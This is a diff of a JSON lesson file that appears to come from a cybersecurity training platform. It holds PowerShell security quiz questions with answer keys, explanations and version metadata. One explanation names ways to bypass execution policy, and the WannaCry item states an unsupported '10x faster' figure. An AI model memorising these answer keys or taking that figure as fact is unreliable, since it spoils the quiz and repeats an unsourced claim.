+      "explanation": "Execution Policy is a safety feature, NOT a security control. It prevents accidental script execution but can be easily bypassed (PowerShell -ExecutionPolicy Bypass, reading script and piping to PowerShell, etc.). Real security comes from AppLocker, WDAC, Constrained Language Mode, and Script Block Logging.",
+      "difficulty": 1,
+      "memory_aid": "Execution Policy ≠ Security. Use AppLocker + Logging for real security",
+      "points": 10
+    },
+    {
+      "question_id": "q5",
+      "type": "multiple_choice",
+      "question": "Which PowerShell feature provides the best visibility into malicious PowerShell usage?",
+      "options": [
+        "Execution Policy set to AllSigned",
+        "Script Block Logging (Event ID 4104)",
+        "PowerShell ISE debugger",
+        "Get-Process filtering"
+      ],
+      "correct_answer": 1,
+      "explanation": "Script Block Logging (Event ID 4104) records all PowerShell script block execution, including deobfuscated code. This gives defenders complete visibility into PowerShell activity and is essential for threat hunting and incident response. It should be enabled via Group Policy in all production environments.",
+      "difficulty": 1,
+      "memory_aid": "Event ID 4104 = See everything PowerShell does",
+      "points": 10
+    },
+    {
+      "question_id": "q6",
+      "type": "multiple_choice",
+      "question": "In a PowerShell script, when should you use Try/Catch blocks?",
+      "options": [
+        "Only when working with files",
+        "Around any operation that might fail, especially network operations, file I/O, and remote commands",
+        "Try/Catch is only for advanced users",
+        "Only in functions, never in main script body"
+      ],
+      "correct_answer": 1,
+      "explanation": "Try/Catch blocks should wrap any operation that might fail - especially risky operations like network calls, file access, remote commands, and database queries. This prevents scripts from crashing and allows you to handle errors gracefully with logging and user feedback.",
+      "difficulty": 1,
+      "memory_aid": "Wrap risky operations in Try/Catch",
+      "points": 10
+    },
+    {
+      "question_id": "q7",
+      "type": "multiple_choice",
+      "question": "What is the correct way to query remote computers for security events?",
+      "options": [
+        "Use Invoke-Command with a ScriptBlock to run Get-EventLog on remote systems",
+        "Copy the event logs via RDP and read them locally",
+        "Email yourself the event logs from each computer",
+        "Remote event log access is not possible with PowerShell"
+      ],
+      "correct_answer": 0,
+      "explanation": "Invoke-Command with a ScriptBlock is the correct way to execute PowerShell commands on remote systems. This uses PowerShell Remoting (WinRM) to run Get-EventLog or Get-WinEvent on multiple computers simultaneously, returning objects you can process locally.",
+      "difficulty": 1,
+      "memory_aid": "Invoke-Command = Run commands remotely on many systems",
+      "points": 10
+    },
+    {
+      "question_id": "q8",
+      "type": "multiple_choice",
+      "question": "During the WannaCry ransomware outbreak, what PowerShell capability was most critical for rapid response?",
+      "options": [
+        "PowerShell ISE's debugging features",
+        "PowerShell Remoting (Invoke-Command) to scan and patch thousands of endpoints quickly",
+        "PowerShell's ability to create GUI applications",
+        "PowerShell's tab completion feature"
+      ],
+      "correct_answer": 1,
+      "explanation": "PowerShell Remoting allowed security teams to rapidly scan thousands of endpoints for vulnerabilities, deploy patches, hunt for infections, and isolate compromised systems - all remotely and at scale. Organizations with PowerShell automation responded 10x faster than those without.",
+      "difficulty": 1,
+      "memory_aid": "WannaCry response = PowerShell Remoting saved thousands of endpoints",
       "points": 10
     }
   ],
   "mastery_threshold": 80,
   "jim_kwik_principles": [
-    "active_learning",
-    "minimum_effective_dose",
     "teach_like_im_10",
     "memory_hooks",
-    "meta_learning",
     "connect_to_what_i_know",
+    "active_learning",
+    "meta_learning",
+    "minimum_effective_dose",
     "reframe_limiting_beliefs",
     "gamify_it",
     "learning_sprint",
     "multiple_memory_pathways"
   ],
-  "base_xp_reward": 120,
+  "base_xp_reward": 250,
   "badge_unlock": null,
-  "is_core_concept": false,
-  "created_at": "2025-10-28T16:52:00",
-  "updated_at": "2025-10-28T16:52:00",
-  "author": "CyberLearn Advanced Curriculum Team",
-  "version": "2.1"
+  "is_core_concept": true,
+  "created_at": "2025-11-06T12:30:00",
+  "updated_at": "2025-11-06T12:30:00",
+  "author": "CyberLearn Curriculum Team",
+  "version": "3.0"
 }
